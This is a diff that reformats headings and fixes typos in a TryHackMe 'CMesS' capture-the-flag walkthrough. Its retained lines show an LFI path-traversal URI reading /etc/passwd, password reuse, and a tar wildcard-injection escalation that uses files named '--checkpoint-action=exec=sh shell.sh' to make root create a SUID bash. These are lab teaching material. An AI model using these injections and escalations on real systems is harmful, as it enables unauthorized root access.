@@ -1,8 +1,11 @@
+# TryHackMe: CMesS
+
 [TryHackMe - CMesS](https://tryhackme.com/room/cmess) is a medium rated room. Though it is not that difficult but definitely helped me to a few more steps while performing a pentest. 
 
 So, let's begin!
 
-# Initial Enumeration
+## Initial Enumeration
+
 The first that we need to do after starting the machine is to add the IP address to `/etc/hosts`.
 
 ```bash
@@ -222,7 +225,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 30.41 seconds
 ```
 
-# Gaining Foothold
+## Gaining Foothold
 
 Here, from the information for port 80 we can conclude that the system is running on Linux. So, we can try to access `/etc/passwd` via LFI and modifying the exploit URI as: `http://cmess.thm/admin/fm/?f=src../../../../../../../../../etc/passwd`. After entering this we land on the file manager page of the CMS.
 
@@ -311,11 +314,11 @@ cd andre
 bash: cd: andre: Permission denied
 ```
 
-# Privilege Escalation
+## Privilege Escalation
 
-## Horizontal
+### Horizontal
 
-From these details, we can see that currently we are logged in as `www-data` and there is another user named `andre` on the system as well. Now, initially we logged into the CMS as `andre` only so, we can check if the password has been reused over here by trying to switch to `andre`' account.
+From these details, we can see that currently we are logged in as `www-data` and there is another user named `andre` on the system as well. Now, initially we logged into the CMS as `andre` only so, we can check if the password has been reused over here by trying to switch to `andre`'s account.
 
 ```bash
 www-data@cmess:/home$ su andre
@@ -436,7 +439,7 @@ andre@cmess:~$ cat user.txt
 
 Now, our next task is to escalate our privileges to `root`.
 
-## Vertical
+### Vertical
 
 For this, we can first check the command that "andre" can run as `sudo`.
 
@@ -487,7 +490,7 @@ andre@cmess:~$
 
 **Steps:**
 
-1. Create a `shell.sh` file that would create a copy of `/bin/bash` and set its SUID bit. So, as the job is being run by `root` a copy of `root`'s `bash` would be created.\
+1. Create a `shell.sh` file that would create a copy of `/bin/bash` and set its SUID bit. So, as the job is being run by `root` a copy of `root`'s `bash` would be created.
 
    ```bash
    andre@cmess:~/backup$ nano shell.sh
@@ -510,7 +513,7 @@ andre@cmess:~$
 3. Create files whose name are similar to that of `tar` options:
 
    ```bash
-   ndre@cmess:~/backup$ touch /home/andre/backup/--checkpoint=1
+   andre@cmess:~/backup$ touch /home/andre/backup/--checkpoint=1
    andre@cmess:~/backup$ touch /home/andre/backup/--checkpoint-action=exec=sh\ shell.sh
    andre@cmess:~/backup$ ls -la
    total 16
